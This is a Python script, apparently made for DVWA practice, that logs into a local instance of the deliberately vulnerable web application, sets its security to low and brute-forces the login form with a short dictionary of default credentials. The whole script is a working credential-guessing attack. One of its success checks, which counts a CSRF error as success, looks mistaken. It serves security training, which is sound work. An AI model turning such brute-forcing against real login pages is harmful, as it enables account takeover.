#!/usr/bin/env python3
import requests
import sys
import urllib.parse

print("=" * 60)
print("DVWA BRUTEFORCE SCRIPT")
print("=" * 60)

# Создаем сессию
s = requests.Session()

print("[*] STEP 1: Login to DVWA")
print("[*] Using credentials: admin / password")

# Логинимся в DVWA
login_url = "http://127.0.0.1/login.php"
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}

try:
    r = s.post(login_url, data=login_data, timeout=10)
    
    if "Login failed" in r.text:
        print("[!] ERROR: Cannot login to DVWA")
        print("[!] Check if DVWA is running")
        sys.exit(1)
    else:
        print("[+] Login successful")
except Exception as e:
    print(f"[!] Connection error: {e}")
    print("[!] Try: http://dvwa.local or http://localhost")
    sys.exit(1)

print("\n[*] STEP 2: Set security to LOW")
security_url = "http://127.0.0.1/security.php"
security_data = {
    'security': 'low',
    'seclev_submit': 'Submit'
}

s.post(security_url, data=security_data)
print("[+] Security level set to LOW")

print("\n[*] STEP 3: Start brute force attack")
target_url = "http://127.0.0.1/vulnerabilities/brute/"

# Все пользователи и пароли из DVWA по умолчанию
users_passwords = {
    'admin': ['password', 'admin', '123456', '12345678', 'qwerty', 'abc123'],
    'gordonb': ['abc123', 'gordonb', 'password', '123456'],
    '1337': ['charley', '1337', 'password', '123456'],
    'pablo': ['letmein', 'pablo', 'password', '123456'],
    'smithy': ['password', 'smithy', '123456']
}

found = False

for user, passwords in users_passwords.items():
    print(f"\n[*] Testing user: {user}")
    print(f"[*] Passwords to try: {len(passwords)}")
    
    for password in passwords:
        # Создаем GET запрос с параметрами
        params = {
            'username': user,
            'password': password,
            'Login': 'Login'
        }
        
        # Кодируем параметры для URL
        query_string = urllib.parse.urlencode(params)
        attack_url = f"{target_url}?{query_string}"
        
        # Отправляем запрос
        try:
            r = s.get(attack_url, timeout=5)
            
            # Проверяем успешность по разным признакам
            success_indicators = [
                'Welcome to the password protected area',
                f'Welcome {user}',
                'successfully',
                'CSRF token is incorrect'  # В DVWA это признак успеха
            ]
            
            for indicator in success_indicators:
                if indicator in r.text:
                    print(f"\n" + "=" * 60)
                    print(f"[+] SUCCESS! Credentials found!")
                    print(f"[+] Username: {user}")
                    print(f"[+] Password: {password}")
                    print("=" * 60)
                    found = True
                    break
            
            if found:
                break
                
        except Exception as e:
            print(f"[!] Error testing {user}:{password} - {e}")
    
    if found:
        break

if not found:
    print("\n" + "=" * 60)
    print("[-] No credentials found in dictionary")
    print("[*] Try these manually in browser:")
    print("    1. Open: http://127.0.0.1/vulnerabilities/brute/")
    print("    2. Try: admin / password")
    print("    3. Try: gordonb / abc123")
    print("    4. Try: 1337 / charley")
    print("=" * 60)

print("\n[*] Script finished")
